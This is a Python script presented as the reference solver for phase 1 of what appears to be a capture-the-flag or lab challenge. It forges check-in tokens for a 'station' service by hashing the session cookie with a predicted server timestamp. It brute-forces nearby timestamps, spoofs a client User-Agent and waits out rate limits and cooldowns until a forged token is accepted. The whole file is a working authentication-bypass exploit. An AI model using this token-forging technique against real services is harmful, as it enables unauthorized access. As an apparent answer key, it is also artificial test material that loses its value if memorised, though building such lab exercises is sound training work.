#!/usr/bin/env python3
"""
Reference solver for phase 1 (load balancer + station token forge).

Token formula: md5(sid + timestamp) - sid is the session cookie, known
from the very first heartbeat response, before any token is ever
attempted. No shared secret/username anywhere.

Time-tracking: anchor to the OBSERVED sync_epoch from a single probe,
plus elapsed time measured with time.monotonic() - never trust local
wall-clock time directly (Docker VM clocks can be unstable), and never
recompute an offset that cancels itself back to a frozen constant.
"""
import sys
import hashlib
import time
from datetime import datetime, timezone

import requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080") + "/station/checkin"
UA = {"User-Agent": "StationSync-Agent/2.1"}

s = requests.Session()


def checkin_paced(data):
    while True:
        r = s.post(BASE, headers=UA, data=data)
        body = r.json()
        if r.status_code == 429:
            wait = body.get("retry_after", 5)
            print(f"    [throttled, waiting {wait}s]")
            time.sleep(wait + 0.2)
            continue
        if body.get("reason") in ("station_exhausted", "cycle_exhausted"):
            wait = body.get("cooldown", 15)
            print(f"    [{body['reason']}, cooling down {wait}s]")
            time.sleep(wait + 0.5)
        return r, body


def probe_and_anchor():
    """Get a fresh observed sync_epoch plus a monotonic anchor point to
    advance it correctly afterward."""
    r, body = checkin_paced({"action": "checkin", "token": "probe"})
    sync_iso = body.get("sync_time")
    if not sync_iso:
        return None, None
    observed_epoch = int(datetime.strptime(sync_iso, "%Y-%m-%dT%H:%M:%SZ").replace(tzinfo=timezone.utc).timestamp())
    anchor_monotonic = time.monotonic()
    return observed_epoch, anchor_monotonic


def solve(max_cycles=20):
    print("[*] probing to anchor to the station's current time...")
    anchor_epoch, anchor_monotonic = probe_and_anchor()
    if anchor_epoch is None:
        print("[!] no sync_time in response - check UA header / connectivity")
        return False

    sid = s.cookies.get("sid")
    print(f"[*] session sid: {sid} (anchor_epoch={anchor_epoch})")

    for cycle in range(max_cycles):
        elapsed = time.monotonic() - anchor_monotonic
        predicted = int(anchor_epoch + elapsed)

        for delta in (0, 1, -1, 2, -2):
            t = predicted + delta
            token = hashlib.md5(f"{sid}{t}".encode()).hexdigest()
            r, body = checkin_paced({"action": "checkin", "token": token})
            result = body.get("result")
            print(f"    cycle {cycle+1}, t={t} (delta {delta:+d}): {result} ({body.get('reason', '')})")
            if result == "accepted":
                print(f"\n[+] SUCCESS - station_id={body.get('station_id')} role={body.get('role')}")
                return True
            if body.get("reason") in ("station_exhausted", "cycle_exhausted"):
                print("    [re-anchoring after rotation]")
                anchor_epoch, anchor_monotonic = probe_and_anchor()
                sid = s.cookies.get("sid")
                break

        time.sleep(1.8)

    print(f"\n[!] gave up after {max_cycles} cycles")
    return False


if __name__ == "__main__":
    solve()
